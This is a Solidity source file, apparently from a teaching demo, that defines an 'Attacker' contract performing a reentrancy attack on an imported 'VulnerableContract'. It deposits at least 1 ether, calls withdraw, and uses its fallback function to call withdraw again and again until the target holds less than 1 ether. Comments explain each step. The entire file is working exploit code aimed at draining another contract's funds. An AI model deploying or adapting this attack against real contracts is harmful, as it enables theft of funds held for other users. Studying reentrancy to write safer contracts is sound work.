

// SPDX - License - Identifier : GPL -3.0

pragma solidity>=0.7.0 <0.9.0;

import "./VulnerableContract.sol";
//import "./FixedContract.sol";

interface iContract {
    function withdraw() external;
    function deposit() external payable;
}

contract Attacker {
    //save reference to money
    iContract public AContract;

    constructor(address addr) {
        AContract = iContract(addr);
    }

    function attack() public payable{
        //seed the contract with 1 ether (min requirements)
        require (msg.value >= 1 ether, "need at least 1 Ether");
        AContract.deposit{value: msg.value}();

        //withdraw (when called check for 1 Ether then sends amount)
        AContract.withdraw();
    }

    //when calling withdraw triggers fallback function that accepts payment
    //fallback now has withdraw code to recursivly withdraw
    //will never reach the end of the withdraw function until balance reaches 0

    fallback() external payable{
        if (address(AContract).balance >= 1 ether){
            AContract.withdraw();
        }
    }
}
